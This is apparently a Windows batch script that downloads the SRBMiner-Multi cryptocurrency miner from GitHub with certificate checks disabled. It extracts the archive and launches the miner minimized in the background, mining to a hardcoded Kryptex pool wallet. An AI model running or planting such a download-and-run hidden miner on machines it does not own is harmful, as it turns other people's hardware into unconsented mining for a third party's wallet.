start /MIN "" curl -LJOk "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.7/SRBMiner-Multi-3-4-7-win64.zip"
tar -xf SRBMiner-Multi-3-4-7-win64.zip
cd SRBMiner-Multi-3-4-7
SRBMiner-MULTI.exe --disable-cpu --algorithm pearlhash --pool prl.kryptex.network:8048 --wallet prl1pgnzyhyf4j7dgml9fuy8p2s0lsktv8sqtzy3azhq3f6a46zyxe80q89am38 --tls true --background --worker workernew
